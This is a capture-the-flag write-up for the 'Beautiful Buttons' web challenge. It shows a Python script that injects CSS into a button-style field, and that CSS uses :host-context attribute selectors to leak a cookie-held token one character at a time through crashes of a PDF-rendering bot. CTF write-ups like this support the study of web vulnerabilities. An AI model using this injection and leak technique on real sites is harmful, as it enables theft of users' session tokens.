# BEAUTIFUL BUTTONS (Web Exploitation)

### Challenge Description:

Hey hackers! I've created a new app to showcase your design skills. This time, I've learned from my past mistakes and made it unhackable. Think you can crack it and uncover the secret?
Pro tip: Try this challenge locally first. Once your exploit works, then attempt it on the remote instance (you can thank me later!).

### Shadow DOM:

Shadow DOM is a web technology that lets developers create parts of a web page that are isolated from the rest. This mini webpage can have its own HTML, CSS, and JavaScript, and it won’t be affected by the styles or scripts of the main page. It enables a completely encapsulated DOM Tree.
In this challenge, Shadow DOM has been used to encapsulate button styles.

### Features of Challenge:

1. Users can customize button styles.
2. Shadow DOM implemented.
3. CSP limits where scripts and styles can be loaded from.

### Exploitation:

Here, there is no strict input validation on the button attributes.

```python
app.post('/generate', async (req, res) => {
    const { bgcolor, text, size, borderRadius } = req.body;
    if (text > 20) {
        res.status(400).send("BTN text too big.....")
    }
    const newButton = new Button({ bgcolor, text, size, borderRadius });
    await newButton.save();
    res.redirect(`/show/${newButton.id}`);
});
```

Here, there's only a character limit on the button text. There are no other restrictions. We can exploit this.

```
const secretTokenHolder = document.querySelector(".container")
function getCookie(name) {
    const nameEQ = `${name}=`;
    const cookies = document.cookie.split(';');
    for (let i = 0; i < cookies.length; i++) {
        let cookie = cookies[i];
        while (cookie.charAt(0) === ' ') cookie = cookie.substring(1);
        if (cookie.indexOf(nameEQ) === 0) {
            return decodeURIComponent(cookie.substring(nameEQ.length, cookie.length));
        }
    }
    return null; // Return null if the cookie was not found
}
secretTokenHolder.setAttribute("secret", getCookie("token") ? getCookie("token") : "f00bar")
```

We need to do something to get secret.

```python
import requests
url = "https://beautiful-buttons.1nf1n1ty.team"

payload = """
#aaa;
}
:host-context(.container[secret^='f']) div{
    background: #FF0000 !important;
}
p{
"""

data = {
    "text": "1nf1n1ty",
    "bgcolor": payload,
    "borderRadius": "5",
}

response = requests.post(url + "/generate", data=data, allow_redirects=False)
post_url = response.headers["Location"]
print(url+post_url)
```

:host-context is a CSS pseudo selector, which I understand acts like an if block. That is, if the element has the class .container, and the secret attribute starts with the letter f, the button background colour will be changed to red.

```python
app.post("/report", checkAuthKey, pdflimiter, async (req, res) => {
    const { post_id, auth_key } = req.body;
    if (isValid(post_id)) {
        const exists = Button.findOne({ id: post_id });
        if (!exists) {
            return res.status(404).json({ "Error": 'Button not found' });
        }
        const url = `http://localhost:${PORT}/show/${post_id}`
        const [playerToken, _] = PlayerAdminToken.getTokenByUserID(auth_key)
        const context = await (await browser).createBrowserContext();
        try {
            const page = await context.newPage();
            await page.setViewport({ width: 1920, height: 1080 });
            await page.setCookie({
                name: "token",
                httpOnly: false,
                value: playerToken,
                url: `http://localhost:${PORT}`
            })
            await page.goto(url, {
                waitUntil: 'networkidle0',
                timeout: TIMEOUT
            });
            await page.pdf({
                path: `pdfs/${post_id}.pdf`,
                format: 'A4',
                printBackground: true,
                margin: {
                    top: '20px',
                    bottom: '20px',
                    left: '20px',
                    right: '20px'
                }
            });
            await page.close()
            await context.close()
            fs.unlink(`pdfs/${post_id}.pdf`, (err) => {
                if (err) {
                    console.error(`Error removing file: ${err.message}`);
                }
            });
            return res.json({ "feedback": 'Not that great!!' });
        } catch (error) {
            await context.close()
            if (error.message.includes('Navigation timeout')) {
                console.error(`Navigation timed out by ${auth_key}: `, error.message);
            } else {
                console.error("An unexpected error occurred:", error);
            }
            return res.status(500).json({ "feedback": "Something went wrong!!" });
        }
    }
    return res.json({ "Error": "Try Harder!!!!" })
})
```

This endpoint generates a PDF of a button preview based on a UUID. If the page loads successfully, 200 OK. Else, 500.
Here, we can trigger a loading error by manipulating the CSS as above, such that everytime a letter of secret is matched, the browser crashes. Then, flag can be found.

### New Stuff Learnt:

- Can use Shadow DOM for complete encapsulation of web components.
- This vuln can be prevented by using latest Shadow DOM APIs and stricter input validation.